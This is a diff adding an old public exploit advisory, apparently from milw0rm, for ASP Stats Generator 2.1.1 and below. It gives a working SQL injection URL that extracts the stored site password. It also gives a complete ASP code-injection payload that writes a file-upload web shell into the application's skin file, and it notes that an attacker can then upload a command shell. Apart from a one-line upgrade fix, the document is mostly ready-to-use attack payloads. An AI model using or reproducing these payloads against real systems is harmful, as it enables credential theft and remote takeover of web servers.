@@ -1,0 +1,51 @@
+/*------------------------------------------------
+		IHS Public advisory 
+-------------------------------------------------*/
+
+ASP Stats Generator SQL-ASP injection - Code Excution 
+ASP Stats Generator is a powerful website counter, completely written in ASP programming language.
+The application is able to track web site activity generating graphical and statistical reports.
+It combines a server side class with a javascript system to get a wide range of visitors' details.
+http://www.weppos.com
+
+Credit:
+The information has been provided by Hamid Ebadi (IHS : IRAN HOMELAND SECURITY)
+The original article can be found at: 
+
+http://www.IHSteam.com
+http://www.hamid.ir/security/
+
+
+Vulnerable Systems:
+ASP Stats Generator 2.1.1 - 2.1 and below
+
+SQL injection :
+
+Example :
+The following URL can be used to trigger an SQL injection vulnerability in the pages.asp:
+http://localhost/myasg/pages.asp?order='&mese=1
+
+Microsoft JET Database Engine error '80040e14' 
+Syntax error in string in query expression 'SUM(Visits) ''. 
+/myasg/pages.asp, line 236 
+
+Exploit :
+
+http://localhost/asg/pages.asp?order=ASC union select sito_psw,1,1 from tblst_config&mese=1
+
+
+ASP Code Injection  :
+Input passed to the strAsgSknPageBgColour (and ...) in "settings_skin.asp"  isn't properly sanitised before being stored in the "inc_skin_file.asp".
+This can be exploited to inject  arbitrary ASP code.
+
+Exploit :
+
+#F9F9F9" : dim path,hstr, mpath, content, filename: mpath=replace(Request.ServerVariables("PATH_TRANSLATED"),"/","\"): content = request("content"): filename = request("filename"): on error resume next: Dim objFSO,f: Set objFSO = Server.CreateObject ("Scripting.FileSystemObject"): if not filename = "" then: response.Write( "Have File.<BR>" ): path = objFSO.GetParentFolderName( mpath ): path = filename: end if: if not content="" then: response.Write( "Contented.<BR>" ): set f = objFSO.CreateTextFile( path ): response.Write( err.Description & "<BR>" ): f.Write( content ): response.Write( err.Description & "<BR>" ): f.close: end if	%><%=filename%><BR><%=path%><BR><%= Request("path") %><BR><FORM ID="SForm" method="post"><TABLE width="300" border="1" ID="Table1"><TR><TD><P align="center"><STRONG><FONT size="6">Upload File</FONT></STRONG></P></TD></TR><TR><TD><TEXTAREA name="content" rows="15" cols="46" ><%=content%></TEXTAREA></TD></TR><TR><TD><P align="center">File Name:<%=strAsgMapPathTo%><INPUT type="text" name="filename" value="<%=filename%>" ></P><P align="center"><INPUT type="submit" value="Upload" ID="Submit1" NAME="Submit1"></P></TD></TR></TABLE></FORM><% objFSO = Nothing: on error goto 0: hstr = "
+[m.r.roohian]
+attacker can upload  "cmd.asp" with this uploader and ...
+
+
+Solution:
+use ASP Stats Generator v2.1.2 (18/06/2006 )
+
+# milw0rm.com [2006-06-19]
